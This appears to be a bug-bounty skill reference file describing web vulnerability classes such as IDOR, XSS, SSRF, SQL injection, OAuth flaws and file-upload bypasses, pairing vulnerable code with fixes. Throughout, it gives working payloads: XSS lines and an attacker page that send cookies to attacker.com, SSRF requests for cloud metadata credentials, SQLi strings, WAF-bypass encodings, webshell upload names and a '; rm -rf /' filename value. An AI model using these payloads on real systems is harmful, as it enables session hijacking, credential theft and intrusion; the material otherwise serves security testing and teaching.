---
name: web2-vuln-classes
description: Complete reference for 24 web2 bug classes with root causes, detection patterns, bypass tables, exploit techniques, and real paid examples. Covers IDOR, auth bypass, XSS, SSRF (11 IP bypass techniques), SQLi, business logic, race conditions, OAuth/OIDC, file upload (10 bypass techniques), GraphQL, LLM/ AI (ASI01-ASI10), API misconfig, ATO (9 paths), SSTI, subdomain takeover, cloud/infra misconfigs, HTTP smuggling, cache poisoning, MFA bypass (7 patterns), SAML attacks, LFI->RCE, deserialization, CSS injection, and error disclosure. Use when hunting a specific vuln class or studying what makes bugs pay.
---

# WEB2 BUG CLASSES — 24 Classes

Root cause, pattern, bypass table, chaining opportunity, real paid examples.

> **Auth-required classes** (🔐): the ones below need **at least one logged-in
> session** loaded into the hunt to be testable. Use `hunt.py --auth-file
> .private/T.json` or `--cookie/--bearer` flags — every recon/scan tool then
> inherits the headers automatically. For IDOR/BOLA/priv-esc, load **two
> sessions** (low- and high-priv) and diff. See `docs/auth-sessions.md`.
>
> 🔐 IDOR · Broken Auth/Access Control · Mass Assignment · OAuth/OIDC · JWT ·
> GraphQL field-level auth · LLM/AI chatbot IDOR · MFA (rate-limit + response
> manipulation tests) · ATO chains · SSRF behind login
>
> The MFA workflow-skip and SAML signature-stripping probes intentionally
> stay **unauthenticated** even when a session is loaded — that's the
> attack premise.

---

## 1. IDOR — INSECURE DIRECT OBJECT REFERENCE  🔐
> #1 most paid web2 class — 30% of all submissions that get paid.
> **Needs two sessions** (A=attacker, B=victim) — load both via `--auth-file`
> and diff audit-log `session_id` hashes to confirm cross-tenant access.

### Root Cause
```python
# VULNERABLE — no ownership check
@app.route('/api/orders/<order_id>')
def get_order(order_id):
    order = db.query("SELECT * FROM orders WHERE id = ?", order_id)
    return jsonify(order)  # Never checks if order belongs to current user!

# SECURE
@app.route('/api/orders/<order_id>')
def get_order(order_id):
    order = db.query("SELECT * FROM orders WHERE id = ? AND user_id = ?",
                     order_id, current_user.id)
```

### Variants
- **V1:** Numeric ID swap — `/api/user/123/profile` → change to 124
- **V2:** UUID swap — enumerate UUID via email invite or other endpoint
- **V3:** Indirect IDOR — `POST /api/export?report_id=456` exports another user's report
- **V4:** Parameter add — `?user_id=other` makes backend use it
- **V5:** HTTP method swap — PUT protected, DELETE not
- **V6:** Old API version — `/v1/users/123` lacks auth that `/v2/` has
- **V7:** GraphQL node — `{ node(id: "base64(User:456)") { email } }`
- **V8:** WebSocket — WS sends `{"action":"get_history","userId":"client-generated-UUID"}`

### Testing Checklist
```
[ ] Two accounts (A=attacker, B=victim)
[ ] Log in as A, perform all actions, note all IDs
[ ] Replay A's requests with A's token but B's IDs
[ ] Test EVERY HTTP method (GET, PUT, DELETE, PATCH)
[ ] Check API v1 vs v2
[ ] Check GraphQL node() queries
[ ] Check WebSocket messages for client-supplied IDs
```

### IDOR Chain Escalation
- IDOR + Read PII = Medium
- IDOR + Write (modify other's data) = High
- IDOR + Admin endpoint = Critical (privilege escalation)
- IDOR + Account takeover path = Critical
- IDOR + Chatbot reads other user's data = High

---

## 2. BROKEN AUTH / ACCESS CONTROL  🔐
> #2 most paid class. The sibling function rule: if 9 endpoints have auth, the 10th that doesn't is your bug.
> **Needs auth loaded** — you're testing which sibling routes a logged-in
> user can reach that shouldn't be reachable. Compare authed responses
> against the same paths hit anonymously.

### The Sibling Rule
```
/api/admin/users  → has auth middleware
/api/admin/export → often MISSING it
/api/admin/delete → often MISSING it
/api/admin/reset  → often MISSING it
```

### Patterns
```javascript
// Missing middleware on sibling
router.get('/admin/users', authenticate, authorize('admin'), getUsers);
router.get('/admin/export', getExport);  // No middleware!

// Client-side role check only
if (user.role === 'admin') showAdminButton();
// Backend: app.post('/api/admin/delete', deleteUser); // no server check!
```

### Real Paid Examples
- **HackerOne TrustHub**: `POST /graphql` with `TrustHubQuery` — no auth, regular user reads all vendors (CVSS 8.7 High)
- **Vienna Chatbot**: WebSocket `get_history` accepts arbitrary UUID — no ownership check (P2)

---

## 3. XSS — CROSS-SITE SCRIPTING

### Stored XSS (highest impact)
```
Input: "<script>document.location='https://attacker.com/c?c='+document.cookie</script>"
Any user viewing page executes attacker JS → cookie theft → session hijack
```

### DOM XSS Sinks (grep for these)
```javascript
innerHTML = userInput           // HIGH RISK
outerHTML = userInput
document.write(userInput)
eval(userInput)
setTimeout(userInput, ...)      // string form
element.src = userInput         // JavaScript URI possible
location.href = userInput
```

> **postMessage is a DOM XSS source** — same sinks above (innerHTML, eval, etc.) become reachable when fed by `addEventListener("message", ...)` without proper `event.origin` validation. See **postMessage Testing** below.

### XSS Bypass Techniques
```javascript
// CSP bypass — unsafe-inline blocked
<img src=x onerror="fetch('https://attacker.com?d='+btoa(document.cookie))">
// Angular template injection
{{constructor.constructor('alert(1)')()}}
// mXSS — mutation-based
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### XSS Chains (escalate to High/Critical)
- XSS + sensitive page (banking/admin) = High
- XSS + CSRF token theft = CSRF bypass on critical action
- XSS + service worker = persistent XSS across pages
- XSS + credential theft via fake login form = ATO
- **No JS allowed?** CSS injection can still exfil tokens via attribute selectors — see **CSS Injection**

**WAF bypass for XSS**: Run `tools/waf_encoder.py "<payload>" --class xss` to get 20+ variants (HTML entity, unicode escape, base64-wrapped). Try `<svg onload=eval(atob('...'))>` or `<svg><animate onbegin=alert(1) attributeName=x dur=1s>` when `<script>` is blocked. Probe which chars are allowed by testing individually, then construct payload from unblocked chars.

### postMessage Testing
DOM XSS variant where `window.addEventListener("message", ...)` lacks proper `event.origin` validation. Common on SDK callbacks, OAuth redirect handlers, iframe widgets, chat/analytics scripts — easy to miss because the entry point is **indirect** (no URL parameter, no form field, source-code grep alone doesn't reveal whether the origin check is sound).

**Vulnerable pattern:**
```js
window.addEventListener("message", (e) => {
  // No e.origin check → any page can postMessage in
  document.getElementById("x").innerHTML = e.data
})
```

**Common origin-check bypasses:**

| Weak check | Bypass | Example that passes |
|---|---|---|
| `e.origin.indexOf("trusted")` | substring anywhere | `https://trusted.attacker.com` |
| `e.origin.startsWith("https://trusted")` | suffix attack | `https://trusted.attacker.com` |
| `e.origin.endsWith(".trusted.com")` | infix attack | `https://evil-trusted.com` (no dot prefix) |
| `e.origin === "null"` | sandboxed iframe | `srcdoc`/`sandbox` iframe → origin literally `"null"` |
| Regex with unescaped `.` | `.` matches any char | `/https?:\/\/trusted\.com/` matches `https://trusted-com.evil.com` |
| No check at all | (just listen) | Any origin |

**Finding listeners:**
```js
// DevTools console (Chromium) — list every message listener registered on window
getEventListeners(window).message
```
```bash
# Source grep when you have JS bundles
grep -rn "addEventListener.*['\"]message['\"]" --include="*.js" | grep -v node_modules
```
- Burp extension: **postMessage-tracker** — auto-logs every postMessage with sender origin
- The actual signal is whether the **sink fires**, not whether a listener exists — always confirm with the attacker page below

**Attacker page template:**
```html
<!-- Hosted on attacker.com -->
<iframe src="https://victim.com" id="v"></iframe>
<script>
  document.getElementById('v').onload = () => {
    document.getElementById('v').contentWindow.postMessage(
      '<img src=x onerror=fetch("//attacker.com/?c="+document.cookie)>',
      '*'  // wildcard target — works regardless of origin policy on send
    )
  }
</script>
```

**Chains That Pay:**
```
postMessage -> innerHTML/eval sink -> DOM XSS                          High
postMessage -> OAuth code/state passing -> code theft -> ATO           Critical
postMessage -> localStorage token override -> session manipulation     High
postMessage -> JSON deserialize sink (eval/Function) -> RCE            Critical (rare)
postMessage handler strict-equals origin (no bypass found)             N/A
SDK postMessage with internal-only contract (no public callers)        Info (chain only)
```

**Triage:**
```
Listener missing origin check + reachable XSS sink (innerHTML/eval)   = High/Critical
Listener missing origin check + OAuth code/state flows through it     = Critical (ATO)
Listener present + origin check has substring/regex bypass            = same severity, PoC required
Listener present + strict equality on origin (=== exact match)        = N/A
Listener exists but only logs / no DOM mutation                       = Low/Info
```

---

## 4. SSRF — SERVER-SIDE REQUEST FORGERY

### Injection Points
```
?url=, ?src=, ?redirect=, ?next=, ?image=, ?webhook=, ?callback=
JSON: {"webhook": "http://...", "avatar_url": "http://..."}
SVG: <image href="http://internal">
```

### SSRF Payloads (escalating impact)
```bash
# DNS-only (Informational — insufficient alone)
https://attacker.burpcollaborator.net

# Cloud metadata (Critical on cloud apps)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Internal port scan
http://localhost:6379     # Redis
http://localhost:9200     # Elasticsearch
http://localhost:2375     # Docker API (RCE)
http://localhost:8080     # Admin panel
```

### SSRF IP Bypass Techniques (11 techniques)

| Technique | Example | Notes |
|---|---|---|
| Decimal IP | `http://2130706433` | 127.0.0.1 as decimal |
| Octal IP | `http://0177.0.0.1` | Octal 0177 = 127 |
| Hex IP | `http://0x7f.0x0.0x0.0x1` | Hex representation |
| Short IP | `http://127.1` | Abbreviated notation |
| IPv6 | `http://[::1]` | Loopback in IPv6 |
| IPv6 mapped | `http://[::ffff:127.0.0.1]` | IPv4-mapped IPv6 |
| DNS rebinding | Attacker DNS → internal IP | First check = external, fetch = internal |
| Redirect chain | External URL → 302 to internal | Vercel pattern — check each hop |
| URL parser confusion | `http://attacker.com#@internal` | Parser inconsistency |
| CNAME to internal | Attacker domain → internal hostname | DNS points inward |
| Rare format | `http://[::ffff:0x7f000001]` | Mixed hex IPv6 |

### SSRF Impact Chain
- DNS-only = Informational
- Internal service accessible = Medium
- Cloud metadata = High (key exposure)
- Cloud metadata + exfil keys = Critical

**WAF bypass for SSRF**: If WAF blocks `127.0.0.1`/`169.254.169.254`, try `2130706433` (decimal), `0x7f000001` (hex), `[::1]` (IPv6), `[::ffff:127.0.0.1]` (IPv4-mapped), `127.0.0.1.nip.io` (DNS rebind), or `127。0。0。1` (full-width period U+3002). Run payload through `tools/waf_encoder.py "<payload>" --class generic`.

---

## 5. BUSINESS LOGIC
> Transferred from web3's "incomplete code path" pattern.

### Pattern 1: Fast Path Skips State Update
```python
def redeem_coupon(coupon_code, user_id):
    coupon = get_coupon(coupon_code)
    if coupon.balance >= amount:
        transfer(user_id, amount)
        return  # MISSING: never marks coupon as used!
    coupon.mark_used()
    transfer(user_id, amount)
```

### Pattern 2: Workflow Step Skip
```
Normal: select plan → add payment → confirm → activate
Attack: skip to /confirm?plan=premium&skip_payment=true
```

### Pattern 3: Negative / Zero Bypass
```
POST /api/transfer {"amount": -100}  → credits attacker, debits victim
POST /api/cart {"quantity": 0}       → adds item free
POST /api/refund {"amount": 99999}   → refunds more than purchased
```

### Pattern 4: Race Condition (TOCTOU)
```
Thread 1: checks balance (10 credits) → PASS
Thread 2: checks balance (10 credits) → PASS
Thread 1: deducts → 0 remaining
Thread 2: deducts → -10 remaining (DOUBLE SPEND)
```

---

## 6. RACE CONDITIONS

### Classic Double-Spend
```python
# VULNERABLE
def spend_credit(user_id, amount):
    balance = get_balance(user_id)    # CHECK
    if balance >= amount:
        deduct(user_id, amount)       # USE — gap here

# SECURE (atomic)
rows = db.execute("UPDATE balances SET amount=amount-? WHERE user_id=? AND amount>=?",
                  amount, user_id, amount)
if rows == 0: raise InsufficientBalance()
```

### Testing
```bash
# Turbo Intruder (Burp) with Last-Byte Sync
# Python parallel
import threading, requests
threads = [threading.Thread(target=lambda: requests.post(url, json={'code':'PROMO123'},
           headers={'Authorization': f'Bearer {token}'})) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

### Race Targets
- Coupon/promo code redemption
- Gift card / credit spending
- Limited stock purchase
- Rate limit bypass (send before counter increments)
- Email verification token

---

## 7. SQL INJECTION

### Detection
```bash
' OR '1'='1
' UNION SELECT NULL--
'; SELECT 1/0--   → divide by zero confirms SQLi

# sqlmap
python3 ~/tools/sqlmap/sqlmap.py -u "https://target.com/search?q=test" --batch --level=3
```

### Grep for Vulnerable Code
```bash
# Python — no placeholder = string concat = vulnerable
grep -rn "execute\|executemany\|raw(" --include="*.py" | grep -v "?"

# JavaScript — string concat in query
grep -rn "\.query(" --include="*.js" --include="*.ts" | grep "\+"

# PHP — variable in raw query
grep -rn "mysql_query\|mysqli_query" --include="*.php" | grep "\$"
```

**WAF bypass for SQLi**: Run `tools/waf_encoder.py "<payload>" --class sqli` for comment-injection (`SE/**/LECT`), MySQL version comment (`/*!50000 UNION*/`), case-mix (`SeLeCt`), operator substitute (`OR`→`||`, `=`→`LIKE`), whitespace swap (`%0a`, `%0b`, `/**/ `). AWS WAF specifically: try `/**/` between every token. ModSecurity: try `/*!50000 UNION*/` + `%0a` space substitution.

---

## 8. OAUTH / OIDC BUGS

### Missing PKCE (Coinbase pattern)
```
Test: GET /oauth2/auth?...&client_id=X (without code_challenge parameter)
Result: If 302 redirect (not error) = PKCE not enforced
Impact: Auth code interception → ATO
```

### State Parameter Bypass (CSRF on OAuth)
```
Start OAuth → don't authorize → capture URL → send to victim
Victim authorizes → their auth code tied to YOUR session → ATO
```

### Open Redirect Bypass Techniques (for OAuth chaining, 11 techniques)

| Technique | Example | Why it works |
|---|---|---|
| @ symbol | `https://legit.com@evil.com` | Browser navigates to evil.com |
| Subdomain abuse | `https://legit.com.evil.com` | evil.com controls subdomain |
| Protocol tricks | `javascript:alert(1)` | XSS via redirect |
| Double encoding | `%252f%252fevil.com` | Decodes to `//evil.com` |
| Backslash | `https://legit.com\@evil.com` | Parsers normalize `\` to `/` |
| Protocol-relative | `//evil.com` | Uses current page's protocol |
| Null byte | `https://legit.com%00.evil.com` | Some parsers truncate at null |
| Unicode IDN | `https://legіt.com` (Cyrillic і) | Visually identical, different domain |
| Data URL | `data:text/html,<script>...` | Direct payload |
| Fragment abuse | `https://legit.com#@evil.com` | Inconsistent parsing |
| Redirect + OAuth | `target.com/callback?redirect_uri=..` | Redirect endpoint |

---

## 9. FILE UPLOAD

### Content-Type Bypass
```
filename=shell.php, Content-Type: image/jpeg  → server trusts Content-Type
filename=shell.phtml, shell.pHp, shell.php5   → extension variants
```

### File Upload Bypass Techniques (10 techniques)

| Attack | How | Prevention |
|---|---|---|
| Extension bypass | `shell.php.jpg`, `shell.pHp`, `shell.php5` | Allowlist + extract final extension |
| Null byte | `shell.php%00.jpg` | Sanitize null bytes |
| Double extension | `shell.jpg.php` | Only allow single extension |
| MIME spoof | Content-Type: image/jpeg with .php body | Validate magic bytes, not MIME header |
| Magic bytes prefix | Prepend `GIF89a;` to PHP code | Parse whole file, not just header |
| Polyglot | Valid as JPEG and PHP | Process as image lib, reject if invalid |
| SVG JavaScript | `<svg onload="...">` | Sanitize SVG or disallow entirely |
| XXE in DOCX | Malicious XML in Office ZIP | Disable external entities |
| ZIP slip | `../../../etc/passwd` in archive | Validate extracted paths |
| Filename injection | `; rm -rf /` in filename | Sanitize + use UUID names |

### Magic Bytes Reference

| Type | Hex |
|---|---|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF | `47 49 46 38` |
| PDF | `25 50 44 46` |
| ZIP/DOCX/XLSX | `50 4B 03 04` |

### Stored XSS via SVG
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

**WAF bypass for file upload**: Run `tools/multipart_mutator.py --file shell.aspx --field file` for 10 parser-confusion variants (boundary simplification, double-boundary case-insensitive confusion, charset=utf-16le part encoding, null-byte in boundary, Content-Disposition sub-param injection, per-part image/jpeg Content-Type). Combine with polyglot (GIF89a magic bytes + PHP payload). RFC 2231 filename: `filename*=utf-8''shell.php`. MIME Base64: `filename="=?utf-8?b?c2hlbGwucGhw?="`.

### Busboy / Undici Multipart Parser Internals (Node.js / Next.js)

**Parser stack:**
- **Busboy** — Next.js multipart/form-data parser (used when `Content-Type: multipart/form-data`)
- **Undici** — Node.js built-in Fetch/FormData parser (used for `Next-Action` header RSC requests)

**Busboy charset decoder quirk:**

Busboy's `getDecoder(charset)` falls through for UTF-16 aliases:
```
case 'utf16le':
case 'utf-16le':
case 'ucs2':
case 'ucs-2':
  return decoders.utf16le;
```

This means `Content-Type: text/plain; charset=utf16le` on a multipart part causes Busboy to decode the part value as UTF-16LE. A WAF inspecting the raw bytes sees null-byte-padded garbage; Busboy reads valid ASCII/payload.

**Bypass technique (D-0, $100k checkpoint):**

```http
POST / HTTP/2
Host: nextjs-cve-hackerone.vercel.app
Next-Action: x
Content-Type: multipart/form-data; boundary=y
Content-Length: [...auto]

--y
Content-Disposition: form-data; name="0"
Content-Type: text/plain; charset=utf16le

<0x00><0x8x00><0x4x8H><0x00><0x00><0x6n><0x00><0x8x00>...[UTF-16LE encoded payload]
--y
Content-Disposition: form-data; name="1"

"$0"
--y--
```

The WAF sees raw UTF-16 bytes (null-byte interleaved); Busboy decodes it as plain ASCII payload including `__proto__` / `:constructor` keys.

## Extended Content

This page only contains the core methodology. Extended reference content (payloads, full tables, detailed examples) has been moved to [`references/`](references/web2-vuln-classes-reference.md) for size management.

